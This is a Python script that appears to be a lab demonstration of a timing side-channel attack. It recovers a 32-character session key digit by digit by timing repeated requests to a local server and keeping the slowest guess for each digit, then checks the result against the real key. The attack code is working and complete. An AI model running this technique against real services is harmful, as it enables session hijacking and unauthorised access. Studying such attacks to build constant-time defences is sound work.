from requests import get
from client import get_session_key
from time import perf_counter_ns

import sys

def _get_request(session_key):
    return get("http://127.0.0.1:5000/user", data={"username": "example_username", "session_key": session_key})

if __name__ == "__main__":

    print_level = int(sys.argv[1])

    actual_key = get_session_key()

    keylen = 32
    num_samples = 10
    hexchars = '0123456789abcdef'
    spoof_key = list('0' * keylen)

    print(f'real key: {actual_key}')

    for key_index in range(keylen):
        chartimes = {}
        if print_level < 3: print(f'Spoof: {"".join(spoof_key)} : Byte {key_index * 4}/128')
        for hex_digit in hexchars:
            if print_level < 2: print(f'\tHex digit: {hex_digit}')
            spoof_key[key_index] = hex_digit
            samples = []
            for x in range(num_samples):
                start = perf_counter_ns()
                _get_request("".join(spoof_key))
                dur = perf_counter_ns() - start
                if print_level < 1: print(f'\t\tTime for request (ns): {dur}')
                samples.append(dur)
            avg_time = sum(samples)/len(samples)
            chartimes[avg_time] = hex_digit
            if print_level < 2: print(f'\tAvg time for digit {hex_digit}: {avg_time}')
        guessed_hex_digit = chartimes[max(chartimes.keys())]
        spoof_key[key_index] = guessed_hex_digit

    
    print(f'Actual key:  {actual_key}')
    print(f'Guessed key: {"".join(spoof_key)}')

    count = 0
    for a, g in zip(actual_key, spoof_key):
        if a == g: count += 1
    print(f'Digits guessed correctly: {count}')





